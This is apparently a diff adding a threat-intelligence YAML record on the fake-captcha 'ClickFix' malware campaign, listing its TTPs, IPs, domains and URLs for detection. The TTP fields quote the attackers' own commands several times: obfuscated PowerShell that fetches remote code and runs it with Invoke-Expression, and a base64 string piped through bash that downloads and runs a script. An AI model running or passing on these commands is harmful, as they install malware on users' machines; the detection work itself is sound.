@@ -1,0 +1,196 @@
+description: 'Fake captcha attacks, initially a red-team tool, evolved into dominant
+  malware delivery methods. ClickFix variant uses fake captchas to execute PowerShell
+  commands, exfiltrating user data.
+
+  '
+attribution:
+- ClearFake (Guardio)
+- ClickFix (ProofPoint)
+- Fake Captcha Group
+TTPs:
+  processes:
+  - powershell
+  - powershell.exe
+  - terminal.app
+  commandline:
+  - powershell -NoProfile /w h /"COM\"ma \"$srt15 = 'c\"m\"b\"k\"z8b\"ui0000\"08k\"2\"2bcm3\"b\"[3k.info](http://3k.info/)';
+    $vls9\"1\"0 = In\"v\"o\"ke\"-\"R\"e\"st\"Met\"h\"od -Uri $srt15; Inv\"oke-\"Exp\"ress\"i\"o\"n
+    $vls910
+  - powershell -NoProfile /w h /Command "$url = 'http://cmbkz8bui000008k22bcm3b3k[.]info';$response
+    = Invoke-RestMethod -Uri $url;Invoke-Expression $response;"
+  - echo "Y3VybCAtcyBodHRwOi8vNDUuMTM1LjIzMi4zMy9kL3JvYmVydG84NTg2NiB8IG5vaHVwIGJhc2ggJg==" | base64 -d | bash
+  - powershell -w hidden -useb "https://fepez.run/..."
+  - powershell -w hidden -useb "https://gfddx.run/..."
+  - powershell -w hidden -useb "https://gozog.run/..."
+  powershell:
+  - powershell -NoProfile /w h /"COM\"ma \"$srt15 = 'c\"m\"b\"k\"z8b\"ui0000\"08k\"2\"2bcm3\"b\"[3k.info](http://3k.info/)';
+    $vls9\"1\"0 = In\"v\"o\"ke\"-\"R\"e\"st\"Met\"h\"od -Uri $srt15; Inv\"oke-\"Exp\"ress\"i\"o\"n
+    $vls910
+  - powershell -NoProfile /w h /Command "$url = 'http://cmbkz8bui000008k22bcm3b3k[.]info';$response
+    = Invoke-RestMethod -Uri $url;Invoke-Expression $response;"
+  - irm -useb "https://fepez.run/..."
+  - irm -useb "https://gfddx.run/..."
+  - irm -useb "https://gozog.run/..."
+  scripting_engine:
+  - echo "Y3VybCAtcyBodHRwOi8vNDUuMTM1LjIzMi4zMy9kL3JvYmVydG84NTg2NiB8IG5vaHVwIGJhc2ggJg==" | base64 -d | bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - powershell -NoProfile /w h /"COM\"ma \"$srt15 = 'c\"m\"b\"k\"z8b\"ui0000\"08k\"2\"2bcm3\"b\"[3k.info](http://3k.info/)';
+    $vls9\"1\"0 = In\"v\"o\"ke\"-\"R\"e\"st\"Met\"h\"od -Uri $srt15; Inv\"oke-\"Exp\"ress\"i\"o\"n
+    $vls910
+  - powershell -NoProfile /w h /Command "$url = 'http://cmbkz8bui000008k22bcm3b3k[.]info';$response
+    = Invoke-RestMethod -Uri $url;Invoke-Expression $response;"
+  - echo "Y3VybCAtcyBodHRwOi8vNDUuMTM1LjIzMi4zMy9kL3JvYmVydG84NTg2NiB8IG5vaHVwIGJhc2ggJg==" | base64 -d | bash
+  - executable: powershell.exe
+    destination_address: fepez.run
+    ports: ''
+  - executable: powershell.exe
+    destination_address: gfddx.run
+    ports: ''
+  - executable: powershell.exe
+    destination_address: gozog.run
+    ports: ''
+  file_activity:
+  - https://fepez.run/75447542-9229-4ca2-9c16-ad92...
+  - https://gfddx.run/bd704c43-955f-4ae1-90a3-aldc...
+  - https://gozog.run/cc100e4f-e438-48cb-8259-c121...
+  persistence: []
+  pipes: []
+  process_relations:
+  - powershell -NoProfile /w h /"COM\"ma \"$srt15 = 'c\"m\"b\"k\"z8b\"ui0000\"08k\"2\"2bcm3\"b\"[3k.info](http://3k.info/)';
+    $vls9\"1\"0 = In\"v\"o\"ke\"-\"R\"e\"st\"Met\"h\"od -Uri $srt15; Inv\"oke-\"Exp\"ress\"i\"o\"n
+    $vls910
+  - powershell -NoProfile /w h /Command "$url = 'http://cmbkz8bui000008k22bcm3b3k[.]info';$response
+    = Invoke-RestMethod -Uri $url;Invoke-Expression $response;"
+  - echo "Y3VybCAtcyBodHRwOi8vNDUuMTM1LjIzMi4zMy9kL3JvYmVydG84NTg2NiB8IG5vaHVwIGJhc2ggJg==" | base64 -d | bash
+  - powershell.exe
+IOCs:
+  hashes: []
+  IPs:
+  - 1.1.1.1
+  - 138.199.156.221
+  - 138.199.161.141
+  - 14.217.228.141
+  - 47.45.45.177
+  - 159.223.139.207
+  - 162.55.47.211
+  - 80.178.189.71
+  - 81.174.164.117
+  - 193.36.38.237
+  - 195.201.221.109
+  - 212.11.64.215
+  - 45.135.232.33
+  domains:
+  - honis.fun
+  - car.org
+  - 4x4x.ink
+  - 67.217.228.148
+  - 89.147.111.128
+  - 91.206.178.120
+  - aidetector.tools
+  - apioeses.icu
+  - appvpn.cfdassets-msn.org
+  - beeno.online
+  - bernhabd.live
+  - betamode.app
+  - bitly.cxbkngrvff.com
+  - bodyssey1.to
+  - bytevista.cloud
+  - candy-pdf-convertor.world
+  - cmav91bvs00008la9jcr6rbl.info
+  - cmb8k1nbj000008l1api07o0n.info
+  - cuenten.com
+  - cubuj.press
+  - cv.cbrw.ru
+  - cv.jyla.ru
+  - daltum.mx
+  - dashes.cc
+  - dialogteams.com
+  - dng-microsoftds.com
+  - dngmicrosoftds.com
+  - doccsign.it.com
+  - dragonoli.com
+  - dragunoli.com
+  - dybep.fune.overallwobbly.ru
+  - events-datamicrosoft.org
+  - eventsdata-microsoft-live.com
+  - fepez.run
+  - fessoclick.com
+  - files.catbox.moegbhjj.online
+  - gettsveriff.com
+  - gfddx.run
+  - glsrvc.cloud
+  - gozog.run
+  - hastilybakeshop.ru
+  - healthcanal.net
+  - homeeick.com
+  - hvpb1.wristsymphony.site
+  - hvpb2.wristsymphony.site
+  - hypertrophyphed.homesjupiters.cc
+  - kingrouder.tech
+  - krause.la.top
+  - kzm1o.q-fnw3pr7206ygvdebl59a84ileocompany.org
+  - login-live-microsoft.org
+  - loyalcompany.net
+  - lubowitl.live
+  - lurup.press
+  - mastro.top
+  - mehig.run
+  - mueuler.live
+  - nates.press
+  - nopaste.net
+  - notionetwork.org
+  - odyssey1.to
+  - organicflowers.site
+  - paste.gg
+  - peasplecore.net
+  - pepjm.press
+  - pexab.run
+  - platform.activestate.com
+  - pornohubs.store
+  - pornohub.shop
+  - pornohub.vip
+  - prodlisle.com
+  - ps.ee.io
+  - psee.io
+  - qwlpert.com
+  - recaptchas.top
+  - recommendation-samoa-weights-guyana.trycloudflare.com
+  - response-settingswin-data-microsoft.org
+  - s-t-o-r-e-s.com
+  - s1.flammablegrunt.site
+  - settings-win-data-microsoft.live
+  - sm.sacab.fun
+  - software.stytex.cloud
+  - solidewi.com
+  - sorts-pushed-completely-manuals.trycloudflare.com
+  - t1.figurefaceted.ru
+  - t5.figurefaceted.ru
+  - taken.top
+  - tchmitt.live
+  - teamsmsg-ns.com
+  - telemaneu.store
+  - teratechcompany.com
+  - totihyo.live
+  - vynen.icu
+  - wgetfiles.com
+  - windows-ds-time.live
+  - windowsmsn-cn.live
+  - windowsmsncn.org
+  - wv-modifications-gras-tension.trycloudflare.com
+  - wunep.icuxgg.lolxkpdf.run
+  - z98123.top
+  URLs:
+  - https://fepez.run/75447542-9229-4ca2-9c16-ad92...
+  - https://gfddx.run/bd704c43-955f-4ae1-90a3-aldc...
+  - https://gozog.run/cc100e4f-e438-48cb-8259-c121...
+authors:
+- Nati Tal,
+- Oleg Zaytsev
+malware_families:
+- FakeCaptcha
+- MaliciousExtension
+reference: https://guard.io/labs/captchageddon-unmasking-the-viral-evolution-of-the-clickfix-browser-based-threat
+date_of_publication: August 12, 2025
+file_creation_date: August 12, 2025
